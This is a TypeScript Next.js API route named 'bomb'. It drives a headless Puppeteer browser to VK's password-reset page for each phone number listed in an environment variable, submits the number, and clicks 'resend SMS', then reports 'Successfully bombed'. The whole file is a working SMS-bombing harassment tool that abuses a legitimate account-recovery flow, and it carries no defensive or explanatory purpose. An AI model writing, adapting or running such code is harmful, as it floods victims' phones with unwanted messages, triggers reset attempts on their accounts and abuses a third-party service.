import { NextApiRequest, NextApiResponse } from "next";
import puppeteer, { executablePath } from "puppeteer-core";
import wait from "./_browser/utils/wait";
import range from "./_browser/utils/range";
import clickResendSmsBtn from "./_browser/actions/clickResendSmsBtn";
import inputPhoneNumber from "./_browser/actions/inputPhoneNumber";
import pressEnter from "./_browser/actions/pressEnter";
import confirmFirstTime from "./_browser/actions/confirmFirstTime";
import confirmSecondTimeIfNeeded from "./_browser/actions/confirmSecondTimeIfNeeded";
import getBrowser from "./_browser/utils/getBrowser";

export default async function bomb(req: NextApiRequest, res: NextApiResponse) {
  const token = process.env.TOKEN;

  const phoneNumbersStr = process.env.PHONE_NUMBERS;
  if (!phoneNumbersStr) throw new Error("no phone numbers are provided");
  
  const phoneNumbers = phoneNumbersStr.split(" ");

  const browser = await getBrowser({ headless: true });
  console.log("Browser launched...");
  
  const promises = phoneNumbers.map(async phoneNumber => {
    const page = await browser.newPage();
    
    await page.goto("https://id.vk.com/restore/#/resetPassword");
    await page.screenshot({ path: "./img.jpeg"})
    
    await inputPhoneNumber(page, phoneNumber);
    await pressEnter(page);
    
    await confirmFirstTime(page);
    await confirmSecondTimeIfNeeded(page);
    
    await clickResendSmsBtn(page);

    await wait(range(5000, 6000));
  });
  await Promise.all(promises);
  await browser.close();

  res.status(200).send("Successfully bombed");
}
